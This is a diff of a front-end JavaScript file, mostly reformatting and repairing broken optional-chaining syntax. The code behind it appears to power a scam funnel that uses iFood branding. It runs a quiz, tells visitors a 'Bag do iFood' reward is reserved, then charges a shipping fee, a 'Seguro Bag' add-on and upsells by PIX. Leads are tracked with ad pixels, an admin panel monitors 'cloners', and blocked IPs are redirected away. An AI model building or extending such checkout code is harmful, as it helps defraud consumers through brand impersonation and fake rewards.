-            reset: true
-        });
+        if (wantsLeads) await loadLeads({ reset: true });
         if (ipBlacklistBody) await loadIpBlacklist();
         if (wantsPages) await loadPageCounts();
         if (shouldAutoLoadSalesInsights) await loadSalesInsights();
@@ -8526,49 +7555,37 @@ function initAdmin() {
         if (wantsCloners) await loadCloners();
     });
 
-    saveBtn ? .addEventListener('click', saveSettings);
-    clonersRefresh ? .addEventListener('click', loadCloners);
-    leadsRefresh ? .addEventListener('click', () => loadLeads({
-        reset: true
-    }));
-    leadsMore ? .addEventListener('click', () => loadLeads({
-        reset: false
-    }));
-    leadsSearch ? .addEventListener('input', () => {
+    saveBtn?.addEventListener('click', saveSettings);
+    clonersRefresh?.addEventListener('click', loadCloners);
+    leadsRefresh?.addEventListener('click', () => loadLeads({ reset: true }));
+    leadsMore?.addEventListener('click', () => loadLeads({ reset: false }));
+    leadsSearch?.addEventListener('input', () => {
         window.clearTimeout(leadsSearchDebounce);
         leadsSearchDebounce = window.setTimeout(() => {
-            loadLeads({
-                reset: true
-            });
+            loadLeads({ reset: true });
         }, 220);
     });
-    leadsSearch ? .addEventListener('keydown', (event) => {
+    leadsSearch?.addEventListener('keydown', (event) => {
         if (event.key !== 'Enter') return;
         event.preventDefault();
         window.clearTimeout(leadsSearchDebounce);
-        loadLeads({
-            reset: true
-        });
+        loadLeads({ reset: true });
     });
-    leadsSearch ? .addEventListener('change', () => {
+    leadsSearch?.addEventListener('change', () => {
         window.clearTimeout(leadsSearchDebounce);
-        loadLeads({
-            reset: true
-        });
+        loadLeads({ reset: true });
     });
-    leadsExport ? .addEventListener('click', exportLeads);
-    publicAudienceBuild ? .addEventListener('click', () => {
-        loadSalesInsights({
-            manual: true
-        });
+    leadsExport?.addEventListener('click', exportLeads);
+    publicAudienceBuild?.addEventListener('click', () => {
+        loadSalesInsights({ manual: true });
     });
-    overviewRangePreset ? .addEventListener('change', async () => {
+    overviewRangePreset?.addEventListener('change', async () => {
         const selected = String(overviewRangePreset.value || 'all');
         if (selected === 'custom') {
             overviewRange = {
                 preset: 'custom',
-                from: String(overviewRangeFrom ? .value || '').trim(),
-                to: String(overviewRangeTo ? .value || '').trim()
+                from: String(overviewRangeFrom?.value || '').trim(),
+                to: String(overviewRangeTo?.value || '').trim()
             };
             syncOverviewRangeUi();
             saveOverviewRange();
@@ -8577,53 +7594,41 @@ function initAdmin() {
         overviewRange = buildPresetRange(selected);
         syncOverviewRangeUi();
         saveOverviewRange();
-        if (wantsLeads) await loadLeads({
-            reset: true
-        });
+        if (wantsLeads) await loadLeads({ reset: true });
         if (shouldAutoLoadSalesInsights) await loadSalesInsights();
-        if (wantsGatewaySales) await loadGatewaySales({
-            keepSelection: true
-        });
+        if (wantsGatewaySales) await loadGatewaySales({ keepSelection: true });
     });
-    overviewRangeApply ? .addEventListener('click', () => {
+    overviewRangeApply?.addEventListener('click', () => {
         applyOverviewRangeAndReload();
     });
-    overviewRangeReset ? .addEventListener('click', async () => {
-        overviewRange = {
-            preset: 'all',
-            from: '',
-            to: ''
-        };
+    overviewRangeReset?.addEventListener('click', async () => {
+        overviewRange = { preset: 'all', from: '', to: '' };
         syncOverviewRangeUi();
         saveOverviewRange();
-        if (wantsLeads) await loadLeads({
-            reset: true
-        });
+        if (wantsLeads) await loadLeads({ reset: true });
         if (shouldAutoLoadSalesInsights) await loadSalesInsights();
-        if (wantsGatewaySales) await loadGatewaySales({
-            keepSelection: true
-        });
+        if (wantsGatewaySales) await loadGatewaySales({ keepSelection: true });
     });
-    overviewRangeFrom ? .addEventListener('change', () => {
+    overviewRangeFrom?.addEventListener('change', () => {
         if (overviewRange.preset !== 'custom') return;
-        overviewRange.from = String(overviewRangeFrom ? .value || '').trim();
+        overviewRange.from = String(overviewRangeFrom?.value || '').trim();
         saveOverviewRange();
         syncOverviewRangeUi();
     });
-    overviewRangeTo ? .addEventListener('change', () => {
+    overviewRangeTo?.addEventListener('change', () => {
         if (overviewRange.preset !== 'custom') return;
-        overviewRange.to = String(overviewRangeTo ? .value || '').trim();
+        overviewRange.to = String(overviewRangeTo?.value || '').trim();
         saveOverviewRange();
         syncOverviewRangeUi();
     });
-    leadsReconcile ? .addEventListener('click', reconcilePix);
-    testPixelBtn ? .addEventListener('click', runPixelTest);
-    testTikTokPixelBtn ? .addEventListener('click', runTikTokPixelTest);
-    testUtmfyBtn ? .addEventListener('click', runUtmfyTest);
-    saleUtmfyBtn ? .addEventListener('click', runUtmfySale);
-    testPushcutBtn ? .addEventListener('click', runPushcutTest);
-    processDispatchBtn ? .addEventListener('click', runDispatchProcess);
-    paymentsActiveGateway ? .addEventListener('change', () => {
+    leadsReconcile?.addEventListener('click', reconcilePix);
+    testPixelBtn?.addEventListener('click', runPixelTest);
+    testTikTokPixelBtn?.addEventListener('click', runTikTokPixelTest);
+    testUtmfyBtn?.addEventListener('click', runUtmfyTest);
+    saleUtmfyBtn?.addEventListener('click', runUtmfySale);
+    testPushcutBtn?.addEventListener('click', runPushcutTest);
+    processDispatchBtn?.addEventListener('click', runDispatchProcess);
+    paymentsActiveGateway?.addEventListener('change', () => {
         const selected = getPrimaryGatewayFromUi();
         setCurrentGatewayCard(selected);
         setGatewayCardOpen(selected, true);
@@ -8632,11 +7637,11 @@ function initAdmin() {
             metricActiveGateway.textContent = gatewayLabelForUi(selected);
         }
     });
-    gatewayGhostspayEnabled ? .addEventListener('change', syncGatewaySwitches);
-    gatewaySunizeEnabled ? .addEventListener('change', syncGatewaySwitches);
-    gatewayParadiseEnabled ? .addEventListener('change', syncGatewaySwitches);
-    gatewayAtomopayEnabled ? .addEventListener('change', syncGatewaySwitches);
-    gatewayBravoPayEnabled ? .addEventListener('change', syncGatewaySwitches);
+    gatewayGhostspayEnabled?.addEventListener('change', syncGatewaySwitches);
+    gatewaySunizeEnabled?.addEventListener('change', syncGatewaySwitches);
+    gatewayParadiseEnabled?.addEventListener('change', syncGatewaySwitches);
+    gatewayAtomopayEnabled?.addEventListener('change', syncGatewaySwitches);
+    gatewayBravoPayEnabled?.addEventListener('change', syncGatewaySwitches);
     gatewayConfigToggles.forEach((button) => {
         button.addEventListener('click', () => {
             const gateway = button.getAttribute('data-gateway-config-toggle') || 'ghostspay';
@@ -8656,10 +7661,7 @@ function initAdmin() {
             navItems.forEach((btn) => btn.classList.remove('is-active'));
             item.classList.add('is-active');
             const section = document.getElementById(target);
-            if (section) section.scrollIntoView({
-                behavior: 'smooth',
-                block: 'start'
-            });
+            if (section) section.scrollIntoView({ behavior: 'smooth', block: 'start' });
         });
     });
 
@@ -8677,9 +7679,7 @@ function initAdmin() {
         if (ok) {
             setLoginVisible(false);
             if (hasPixelForm || hasUtmfyForm || hasPaymentsForm || hasFeatureForm) loadSettings();
-            if (wantsLeads) loadLeads({
-                reset: true
-            });
+            if (wantsLeads) loadLeads({ reset: true });
             if (ipBlacklistBody) loadIpBlacklist();
             if (wantsPages) loadPageCounts();
             if (shouldAutoLoadSalesInsights) loadSalesInsights();
@@ -8690,14 +7690,10 @@ function initAdmin() {
             const refreshIntervalMs = 10000;
             setInterval(() => {
                 if (document.visibilityState !== 'visible') return;
-                if (wantsLeads) loadLeads({
-                    reset: true
-                });
+                if (wantsLeads) loadLeads({ reset: true });
                 if (wantsPages) loadPageCounts();
                 if (shouldAutoLoadSalesInsights) loadSalesInsights();
-                if (wantsGatewaySales) loadGatewaySales({
-                    keepSelection: true
-                });
+                if (wantsGatewaySales) loadGatewaySales({ keepSelection: true });
                 if (wantsBackredirects) loadBackredirects();
                 if (wantsCloners) loadCloners();
             }, refreshIntervalMs);
@@ -8708,12 +7704,7 @@ function initAdmin() {
 }
 
 function renderQuestion(questionConfig, refs) {
-    const {
-        questionText,
-        optionsContainer,
-        questionCount,
-        progressFill
-    } = refs;
+    const { questionText, optionsContainer, questionCount, progressFill } = refs;
 
     questionText.innerText = questionConfig.text;
     optionsContainer.innerHTML = '';
@@ -8949,15 +7940,12 @@ function clearCoupon() {
 }
 
 function isEconomicoShipping(shipping) {
-    return String(shipping ? .id || '').trim().toLowerCase() === 'economico';
+    return String(shipping?.id || '').trim().toLowerCase() === 'economico';
 }
 
 function normalizeEconomicoShippingTicket(shipping) {
     if (!shipping || typeof shipping !== 'object' || !isEconomicoShipping(shipping)) {
-        return {
-            shipping,
-            changed: false
-        };
+        return { shipping, changed: false };
     }
 
     const price = Number(shipping.price || 0);
@@ -8967,10 +7955,7 @@ function normalizeEconomicoShippingTicket(shipping) {
         Math.abs(price - LEGACY_ECONOMICO_SHIPPING_PRICE) < 0.001
     );
     if (!hasLegacyValue) {
-        return {
-            shipping,
-            changed: false
-        };
+        return { shipping, changed: false };
     }
 
     const normalized = {
@@ -8982,16 +7967,14 @@ function normalizeEconomicoShippingTicket(shipping) {
     delete normalized.coupon;
     delete normalized.amountOff;
     delete normalized.discountApplied;
-    return {
-        shipping: normalized,
-        changed: true
-    };
+    return { shipping: normalized, changed: true };
 }
 
 function buildShippingOptions(rawCep) {
     const coupon = loadCoupon();
-    const amountOff = Number(coupon ? .amountOff || 0) || roundMoney(25.9 * Number(coupon ? .discount || 0));
-    const baseOptions = [{
+    const amountOff = Number(coupon?.amountOff || 0) || roundMoney(25.9 * Number(coupon?.discount || 0));
+    const baseOptions = [
+        {
             id: 'economico',
             name: 'Envio Econômico iFood',
             price: ECONOMICO_SHIPPING_PRICE,
@@ -9026,20 +8009,17 @@ function buildShippingOptions(rawCep) {
 function resolveRewardById(value = '') {
     const id = String(value || '').trim().toLowerCase();
     if (!id || !Object.prototype.hasOwnProperty.call(REWARD_CATALOG, id)) return null;
-    return { ...REWARD_CATALOG[id]
-    };
+    return { ...REWARD_CATALOG[id] };
 }
 
 function resolveRewardSelection(value = null) {
     if (value === undefined || value === null || value === '') return null;
-    const source = value && typeof value === 'object' && !Array.isArray(value) ?
-        value :
-        {
-            id: value
-        };
-    const reward = resolveRewardById(source ? .id || source);
+    const source = value && typeof value === 'object' && !Array.isArray(value)
+        ? value
+        : { id: value };
+    const reward = resolveRewardById(source?.id || source);
     if (!reward) return null;
-    const selectedAt = Number(source ? .selectedAt || 0);
+    const selectedAt = Number(source?.selectedAt || 0);
     return {
         ...reward,
         selectedAt: selectedAt > 0 ? selectedAt : 0
@@ -9047,12 +8027,12 @@ function resolveRewardSelection(value = null) {
 }
 
 function getRewardExtraPrice(reward = null) {
-    return Number(reward ? .checkoutExtraPrice || reward ? .extraPrice || reward ? .rewardExtraPrice || 0);
+    return Number(reward?.checkoutExtraPrice || reward?.extraPrice || reward?.rewardExtraPrice || 0);
 }
 
 function getRewardCheckoutCopy(reward = null) {
     const resolvedReward = resolveRewardSelection(reward || 'bag') || resolveRewardById('bag');
-    switch (String(resolvedReward ? .id || 'bag')) {
+    switch (String(resolvedReward?.id || 'bag')) {
         case 'bau':
             return {
                 title: 'Seu baú já está reservado',
@@ -9136,7 +8116,7 @@ function applyCouponToShipping(shipping) {
     const normalizedTicket = normalizeEconomicoShippingTicket(shipping);
     const baseShipping = normalizedTicket.shipping;
     const coupon = loadCoupon();
-    const amountOff = Number(coupon ? .amountOff || 0) || roundMoney(25.9 * Number(coupon ? .discount || 0));
+    const amountOff = Number(coupon?.amountOff || 0) || roundMoney(25.9 * Number(coupon?.discount || 0));
     if (!amountOff) {
         if (normalizedTicket.changed) saveShipping(baseShipping);
         return baseShipping;
@@ -9220,13 +8200,13 @@ function getPixPersonalPayload() {
 function getPixAddressPayload() {
     const address = loadAddress() || {};
     const cityLine = String(address.cityLine || '');
-    const stateFromLine = cityLine.includes('-') ? cityLine.split('-')[1] ? .trim() : '';
-    const cityFromLine = cityLine.includes('-') ? cityLine.split('-')[0] ? .trim() : cityLine.trim();
+    const stateFromLine = cityLine.includes('-') ? cityLine.split('-')[1]?.trim() : '';
+    const cityFromLine = cityLine.includes('-') ? cityLine.split('-')[0]?.trim() : cityLine.trim();
     return {
         ...address,
         cep: String(address.cep || '').trim(),
-        street: String(address.street || '').trim() || String(address.streetLine || '').split(',')[0] ? .trim() || 'Rua não informada',
-        neighborhood: String(address.neighborhood || '').trim() || String(address.streetLine || '').split(',')[1] ? .trim() || 'Centro',
+        street: String(address.street || '').trim() || String(address.streetLine || '').split(',')[0]?.trim() || 'Rua não informada',
+        neighborhood: String(address.neighborhood || '').trim() || String(address.streetLine || '').split(',')[1]?.trim() || 'Centro',
         city: String(address.city || '').trim() || cityFromLine || 'Sao Paulo',
         state: String(address.state || '').trim() || stateFromLine || 'SP'
     };
@@ -9296,7 +8276,7 @@ function canReuseRecentPixCharge(pixData, expected = {}) {
     }
 
     const expectedReward = String(expected.rewardId || '').trim();
-    const storedReward = String(pixData.rewardId || pixData.reward ? .id || '').trim();
+    const storedReward = String(pixData.rewardId || pixData.reward?.id || '').trim();
     if (expectedReward && expectedReward !== storedReward) {
         return false;
     }
@@ -9312,29 +8292,24 @@ async function postPixCreateWithSessionRetry(payload) {
     const send = async () => {
         const response = await fetch('/api/pix/create', {
             method: 'POST',
-            headers: {
-                'Content-Type': 'application/json'
-            },
+            headers: { 'Content-Type': 'application/json' },
             credentials: 'same-origin',
             body: JSON.stringify(payload)
         });
         const body = await response.json().catch(() => ({}));
-        return {
-            response,
-            body
-        };
+        return { response, body };
     };
 
     let attempt = await send();
-    if (isBlockedApiPayload(attempt ? .response, attempt ? .body)) {
+    if (isBlockedApiPayload(attempt?.response, attempt?.body)) {
         redirectToBlockedPage();
         return attempt;
     }
-    const firstError = String(attempt ? .body ? .error || '').trim();
+    const firstError = String(attempt?.body?.error || '').trim();
     if (!attempt.response.ok && (attempt.response.status === 401 || looksLikeSessionError(firstError))) {
         await ensureApiSession(true).catch(() => null);
         attempt = await send();
-        if (isBlockedApiPayload(attempt ? .response, attempt ? .body)) {
+        if (isBlockedApiPayload(attempt?.response, attempt?.body)) {
             redirectToBlockedPage();
             return attempt;
         }
@@ -9356,10 +8331,7 @@ function loadPixCreateLock() {
             localStorage.removeItem(STORAGE_KEYS.pixCreateLock);
             return null;
         }
-        return {
-            key,
-            expiresAt
-        };
+        return { key, expiresAt };
     } catch (_error) {
         return null;
     }
@@ -9392,37 +8364,36 @@ function clearPixCreateLock(lockKey = '') {
 }
 
 async function createPixCharge(shipping, bumpPrice, options = {}) {
-    const isUpsell = Boolean(options ? .upsell ? .enabled);
-    const shippingInput = shipping && typeof shipping === 'object' ? { ...shipping
-    } : null;
+    const isUpsell = Boolean(options?.upsell?.enabled);
+    const shippingInput = shipping && typeof shipping === 'object' ? { ...shipping } : null;
     const shippingForPix = isUpsell ? shippingInput : applyCouponToShipping(shippingInput);
-    const reward = resolveRewardSelection(options ? .reward || loadRewardSelection() || 'bag') || resolveRewardById('bag');
-    const shippingPrice = Number(shippingForPix ? .price || 0);
+    const reward = resolveRewardSelection(options?.reward || loadRewardSelection() || 'bag') || resolveRewardById('bag');
+    const shippingPrice = Number(shippingForPix?.price || 0);
     const rewardExtraPrice = isUpsell ? 0 : getRewardExtraPrice(reward);
     if (!shippingForPix || !Number.isFinite(shippingPrice) || shippingPrice < 0) {
         throw new Error('Selecione um frete valido antes de gerar o PIX.');
     }
     const extraChargeRaw = Number(bumpPrice || 0);
-    const extraCharge = Number.isFinite(extraChargeRaw) && extraChargeRaw > 0 ?
-        Number(extraChargeRaw.toFixed(2)) :
-        0;
+    const extraCharge = Number.isFinite(extraChargeRaw) && extraChargeRaw > 0
+        ? Number(extraChargeRaw.toFixed(2))
+        : 0;
     const amount = Number((shippingPrice + rewardExtraPrice + extraCharge).toFixed(2));
     const sessionId = getLeadSessionId();
     const lockKey = [
         sessionId,
         isUpsell ? 'upsell' : 'base',
-        String(shippingForPix ? .id || ''),
-        String(reward ? .id || 'bag'),
+        String(shippingForPix?.id || ''),
+        String(reward?.id || 'bag'),
         String(amount.toFixed(2))
     ].join('|');
 
     const cachedPix = loadPix();
     if (canReuseRecentPixCharge(cachedPix, {
-            amount,
-            shippingId: shippingForPix ? .id || '',
-            rewardId: reward ? .id || 'bag',
-            isUpsell
-        })) {
+        amount,
+        shippingId: shippingForPix?.id || '',
+        rewardId: reward?.id || 'bag',
+        isUpsell
+    })) {
         setStage('pix');
         redirect(resolvePixPaymentTargetUrl(cachedPix));
         return;
@@ -9447,7 +8418,7 @@ async function createPixCharge(shipping, bumpPrice, options = {}) {
 
         const trackEventRequested = isUpsell ? 'upsell_pix_create_requested' : 'pix_create_requested';
         const trackEventCreated = isUpsell ? 'upsell_pix_created_front' : 'pix_created_front';
-        const sourceStage = String(options ? .sourceStage || getStage() || document.body ? .dataset ? .page || '')
+        const sourceStage = String(options?.sourceStage || getStage() || document.body?.dataset?.page || '')
             .trim()
             .toLowerCase();
         const addPaymentInfoEventId = buildAddPaymentInfoEventId(sessionId);
@@ -9459,13 +8430,8 @@ async function createPixCharge(shipping, bumpPrice, options = {}) {
             sourceUrl: window.location.href,
             utm: getUtmData(),
             shipping: shippingForPix,
-            reward: reward ? {
-                id: reward.id
-            } : null,
-            bump: extraCharge > 0 ? {
-                title: 'Seguro Bag',
-                price: extraCharge
-            } : null,
+            reward: reward ? { id: reward.id } : null,
+            bump: extraCharge > 0 ? { title: 'Seguro Bag', price: extraCharge } : null,
             personal: getPixPersonalPayload(),
             address: getPixAddressPayload(),
             extra: loadAddressExtra(),
@@ -9473,22 +8439,19 @@ async function createPixCharge(shipping, bumpPrice, options = {}) {
             addPaymentInfoEventId,
             upsell: isUpsell ? {
                 enabled: true,
-                kind: String(options ? .upsell ? .kind || 'frete_1dia'),
-                title: String(options ? .upsell ? .title || 'Prioridade de envio'),
-                price: Number(options ? .upsell ? .price || extraCharge || shippingPrice || 0),
-                previousTxid: String(options ? .upsell ? .previousTxid || ''),
-                targetAfterPaid: String(options ? .upsell ? .targetAfterPaid || '')
+                kind: String(options?.upsell?.kind || 'frete_1dia'),
+                title: String(options?.upsell?.title || 'Prioridade de envio'),
+                price: Number(options?.upsell?.price || extraCharge || shippingPrice || 0),
+                previousTxid: String(options?.upsell?.previousTxid || ''),
+                targetAfterPaid: String(options?.upsell?.targetAfterPaid || '')
             } : null
         };
 
-        const {
-            response: res,
-            body: data
-        } = await postPixCreateWithSessionRetry(payload);
+        const { response: res, body: data } = await postPixCreateWithSessionRetry(payload);
         if (!res.ok) {
-            const message = normalizeApiErrorMessage(data ? .error || '') || 'Falha ao gerar o PIX. Tente novamente em instantes.';
+            const message = normalizeApiErrorMessage(data?.error || '') || 'Falha ao gerar o PIX. Tente novamente em instantes.';
             trackLead(isUpsell ? 'upsell_pix_create_failed' : 'pix_create_failed', {
-                stage: isUpsell ? (String(options ? .sourceStage || '').trim() || 'upsell') : 'orderbump',
+                stage: isUpsell ? (String(options?.sourceStage || '').trim() || 'upsell') : 'orderbump',
                 shipping: shippingForPix,
                 reward,
                 bump: payload.bump,
@@ -9502,20 +8465,20 @@ async function createPixCharge(shipping, bumpPrice, options = {}) {
             amount,
             shippingId: shippingForPix.id,
             shippingName: shippingForPix.name,
-            rewardId: String(data ? .rewardId || reward ? .id || 'bag'),
-            rewardName: String(data ? .rewardName || reward ? .name || 'Bag do iFood'),
-            rewardExtraPrice: Number(data ? .rewardExtraPrice ? ? rewardExtraPrice ? ? 0),
-            rewardAsset: reward ? .asset || '',
-            rewardAlt: reward ? .pixAlt || reward ? .name || '',
+            rewardId: String(data?.rewardId || reward?.id || 'bag'),
+            rewardName: String(data?.rewardName || reward?.name || 'Bag do iFood'),
+            rewardExtraPrice: Number(data?.rewardExtraPrice ?? rewardExtraPrice ?? 0),
+            rewardAsset: reward?.asset || '',
+            rewardAlt: reward?.pixAlt || reward?.name || '',
             bumpName: extraCharge > 0 ? 'Seguro Bag' : '',
             bumpPrice: extraCharge,
             createdAt: Date.now(),
             isUpsell,
             upsell: payload.upsell,
             reward: reward ? {
-                id: String(data ? .rewardId || reward.id),
-                name: String(data ? .rewardName || reward.name),
-                checkoutExtraPrice: Number(data ? .rewardExtraPrice ? ? rewardExtraPrice ? ? 0),
+                id: String(data?.rewardId || reward.id),
+                name: String(data?.rewardName || reward.name),
+                checkoutExtraPrice: Number(data?.rewardExtraPrice ?? rewardExtraPrice ?? 0),
                 asset: reward.asset,
                 pixTitle: reward.pixTitle,
                 pixAlt: reward.pixAlt
@@ -9587,8 +8550,8 @@ function redirectToBlockedPage() {
 
 function isBlockedApiPayload(response, body = null) {
     if (!response || Number(response.status || 0) !== 403) return false;
-    const errorText = String(body ? .error || '').toLowerCase();
-    return body ? .blocked === true || body ? .code === 'ip_blocked' || errorText.includes('bloqueado');
+    const errorText = String(body?.error || '').toLowerCase();
+    return body?.blocked === true || body?.code === 'ip_blocked' || errorText.includes('bloqueado');
 }
 
 async function ensureApiSession(force = false) {
@@ -9603,10 +8566,10 @@ async function ensureApiSession(force = false) {
     }
 
     state.apiSessionPromise = fetch('/api/site/session', {
-            method: 'GET',
-            cache: 'no-store',
-            credentials: 'same-origin'
-        })
+        method: 'GET',
+        cache: 'no-store',
+        credentials: 'same-origin'
+    })
         .then(async (res) => {
             const body = await res.json().catch(() => ({}));
             if (isBlockedApiPayload(res, body)) {
@@ -9646,7 +8609,7 @@ const TRACKING_QUERY_KEYS = [
 
 function safeStorageGet(storage, key) {
     try {
-        return storage ? .getItem(key) || '';
+        return storage?.getItem(key) || '';
     } catch (_error) {
         return '';
     }
@@ -9654,7 +8617,7 @@ function safeStorageGet(storage, key) {
 
 function safeStorageSet(storage, key, value) {
     try {
-        storage ? .setItem(key, value);
+        storage?.setItem(key, value);
         return true;
     } catch (_error) {
         return false;
@@ -9705,11 +8668,11 @@ function normalizeTrafficPlatform(value = '') {
 }
 
 function inferTrafficPlatform(input = {}) {
-    const ttclid = String(input ? .ttclid || '').trim();
-    const fbclid = String(input ? .fbclid || '').trim();
-    const explicit = normalizeTrafficPlatform(input ? .ad_platform || input ? .utm_source || '');
-    const referrer = String(input ? .referrer || '').trim().toLowerCase();
-    const userAgent = String(input ? .user_agent || input ? .userAgent || navigator.userAgent || '').trim().toLowerCase();
+    const ttclid = String(input?.ttclid || '').trim();
+    const fbclid = String(input?.fbclid || '').trim();
+    const explicit = normalizeTrafficPlatform(input?.ad_platform || input?.utm_source || '');
+    const referrer = String(input?.referrer || '').trim().toLowerCase();
+    const userAgent = String(input?.user_agent || input?.userAgent || navigator.userAgent || '').trim().toLowerCase();
 
     if (ttclid) return 'tiktok';
     if (fbclid) return 'meta';
@@ -9772,9 +8735,7 @@ function trackPageView(page) {
     const pageViewEventId = getCurrentPageViewEventId(page);
     const send = () => fetch('/api/lead/pageview', {
         method: 'POST',
-        headers: {
-            'Content-Type': 'application/json'
-        },
+        headers: { 'Content-Type': 'application/json' },
         credentials: 'same-origin',
         body: JSON.stringify({
             sessionId: getLeadSessionId(),
@@ -9791,11 +8752,11 @@ function trackPageView(page) {
 
     ensureApiSession().then(async () => {
         let response = await send().catch(() => null);
-        if (response ? .status === 401) {
+        if (response?.status === 401) {
             await ensureApiSession(true).catch(() => null);
             response = await send().catch(() => null);
         }
-        if (response ? .status === 403) {
+        if (response?.status === 403) {
             redirectToBlockedPage();
             return;
         }
@@ -9836,22 +8797,18 @@ async function ensureSiteConfig(force = false) {
         return state.siteConfig;
     }
     try {
-        const res = await fetch('/api/site/config', {
-            cache: 'no-store'
-        });
+        const res = await fetch('/api/site/config', { cache: 'no-store' });
         const data = await res.json().catch(() => ({}));
         if (isBlockedApiPayload(res, data)) {
             redirectToBlockedPage();
-            return {
-                blocked: true
-            };
+            return { blocked: true };
         }
         if (!res.ok) throw new Error('config');
         state.siteConfig = data || {};
         state.siteConfigAt = Date.now();
-        state.pixelConfig = data ? .pixel || null;
+        state.pixelConfig = data?.pixel || null;
         state.pixelConfigAt = Date.now();
-        state.tiktokPixelConfig = data ? .tiktokPixel || null;
+        state.tiktokPixelConfig = data?.tiktokPixel || null;
         state.tiktokPixelConfigAt = Date.now();
         localStorage.setItem(STORAGE_KEYS.pixelConfig, JSON.stringify(state.pixelConfig));
         localStorage.setItem(STORAGE_KEYS.tiktokPixelConfig, JSON.stringify(state.tiktokPixelConfig));
@@ -9881,17 +8838,17 @@ async function ensureSiteConfig(force = false) {
 
 async function ensurePixelConfig(force = false) {
     const site = await ensureSiteConfig(force);
-    return site ? .pixel || state.pixelConfig || null;
+    return site?.pixel || state.pixelConfig || null;
 }
 
 async function ensureTikTokPixelConfig(force = false) {
     const site = await ensureSiteConfig(force);
-    return site ? .tiktokPixel || state.tiktokPixelConfig || null;
+    return site?.tiktokPixel || state.tiktokPixelConfig || null;
 }
 
 async function isOrderBumpEnabled() {
     const site = await ensureSiteConfig(false);
-    const enabled = site ? .features ? .orderbump;
+    const enabled = site?.features?.orderbump;
     return enabled !== false;
 }
 
@@ -9905,23 +8862,14 @@ function loadFacebookPixel(pixelId) {
 
     /* eslint-disable */
     if (!window.fbq) {
-        ! function(f, b, e, v, n, t, s) {
-            if (f.fbq) return;
-            n = f.fbq = function() {
-                n.callMethod ?
-                    n.callMethod.apply(n, arguments) : n.queue.push(arguments)
-            };
-            if (!f._fbq) f._fbq = n;
-            n.push = n;
-            n.loaded = !0;
-            n.version = '2.0';
-            n.queue = [];
-            t = b.createElement(e);
-            t.async = !0;
-            t.src = v;
-            s = b.getElementsByTagName(e)[0];
-            s.parentNode.insertBefore(t, s)
-        }(window, document, 'script', 'https://connect.facebook.net/en_US/fbevents.js');
+        !function(f,b,e,v,n,t,s){
+            if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+            n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+            if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+            n.queue=[];t=b.createElement(e);t.async=!0;
+            t.src=v;s=b.getElementsByTagName(e)[0];
+            s.parentNode.insertBefore(t,s)
+        }(window, document,'script','https://connect.facebook.net/en_US/fbevents.js');
     }
     /* eslint-enable */
 
@@ -9956,7 +8904,7 @@ function loadTikTokPixel(pixelId, options = {}) {
 
     /* eslint-disable */
     if (!window.ttq || typeof window.ttq.load !== 'function') {
-        ! function(w, d, t) {
+        !function(w, d, t) {
             w.TiktokAnalyticsObject = t;
             const ttq = w[t] = w[t] || [];
             ttq.methods = [
@@ -10028,15 +8976,11 @@ function getCookieValue(name) {
 }
 
 function getPixelBrowserContext(utm = {}) {
-    const fbclid = String(utm ? .fbclid || '').trim();
+    const fbclid = String(utm?.fbclid || '').trim();
     const fbp = String(getCookieValue('_fbp') || '').trim();
     const cookieFbc = String(getCookieValue('_fbc') || '').trim();
     const fbc = cookieFbc || (fbclid ? `fb.1.${Date.now()}.${fbclid}` : '');
-    return {
-        fbclid,
-        fbp,
-        fbc
-    };
+    return { fbclid, fbp, fbc };
 }
 
 function sanitizeEventIdToken(value, maxLen = 48) {
@@ -10054,7 +8998,7 @@ function buildLeadEventId(sessionId = '') {
 }
 
 function buildPageViewEventId(page = '', sessionId = '') {
-    const pageToken = sanitizeEventIdToken(page || document.body ? .dataset ? .page || 'page', 24);
+    const pageToken = sanitizeEventIdToken(page || document.body?.dataset?.page || 'page', 24);
     const sessionToken = sanitizeEventIdToken(sessionId || getLeadSessionId(), 24);
     return `pv_${pageToken}_${sessionToken}`;
 }
@@ -10075,9 +9019,9 @@ function buildViewContentEventId(sessionId = '') {
 }
 
 function buildPurchaseEventId(payload = {}) {
-    const txid = String(payload ? .pix ? .idTransaction || payload ? .pix ? .idtransaction || payload ? .pix ? .txid || '').trim();
+    const txid = String(payload?.pix?.idTransaction || payload?.pix?.idtransaction || payload?.pix?.txid || '').trim();
     if (txid) return txid;
-    const sessionId = String(payload ? .sessionId || getLeadSessionId()).trim();
+    const sessionId = String(payload?.sessionId || getLeadSessionId()).trim();
     if (sessionId) return sessionId;
     const token = sanitizeEventIdToken(getLeadSessionId());
     return `purchase_${token}`;
@@ -10092,7 +9036,7 @@ function buildRuntimePixelEventNonce() {
 }
 
 function getMetaRuntimeEventId(kind = '', page = '') {
-    const pageToken = sanitizeEventIdToken(page || document.body ? .dataset ? .page || 'page', 24);
+    const pageToken = sanitizeEventIdToken(page || document.body?.dataset?.page || 'page', 24);
     const key = `${String(kind || '').trim()}:${pageToken}`;
     if (!state.metaRuntimeEventIds[key]) {
         const sessionToken = sanitizeEventIdToken(getLeadSessionId(), 18);
@@ -10102,7 +9046,7 @@ function getMetaRuntimeEventId(kind = '', page = '') {
 }
 
 function getCurrentPageViewEventId(page = '') {
-    return getMetaRuntimeEventId('pv', page || document.body ? .dataset ? .page || 'page');
+    return getMetaRuntimeEventId('pv', page || document.body?.dataset?.page || 'page');
 }
 
 function getCurrentInitiateCheckoutEventId() {
@@ -10155,12 +9099,12 @@ function markPixelEventSent(provider = '', eventName = '', eventId = '') {
 }
 
 function isBrowserPixelEnabled(config = {}) {
-    return Boolean(config ? .enabled && String(config ? .id || '').trim());
+    return Boolean(config?.enabled && String(config?.id || '').trim());
 }
 
 function getMetaPixelTargets(config = {}) {
-    const primaryId = String(config ? .id || '').trim();
-    const backupId = String(config ? .backupId || '').trim();
+    const primaryId = String(config?.id || '').trim();
+    const backupId = String(config?.backupId || '').trim();
     const targets = [];
     if (primaryId) targets.push(primaryId);
     if (backupId && backupId !== primaryId) targets.push(backupId);
@@ -10168,13 +9112,13 @@ function getMetaPixelTargets(config = {}) {
 }
 
 function resolveTrackedPixelProviders(utm = {}, options = {}) {
-    const metaPixel = options ? .metaConfig || state.pixelConfig;
-    const tiktokPixel = options ? .tiktokConfig || state.tiktokPixelConfig;
+    const metaPixel = options?.metaConfig || state.pixelConfig;
+    const tiktokPixel = options?.tiktokConfig || state.tiktokPixelConfig;
     const hasMeta = isBrowserPixelEnabled(metaPixel);
     const hasTikTok = isBrowserPixelEnabled(tiktokPixel);
     const sourcePlatform = inferTrafficPlatform({
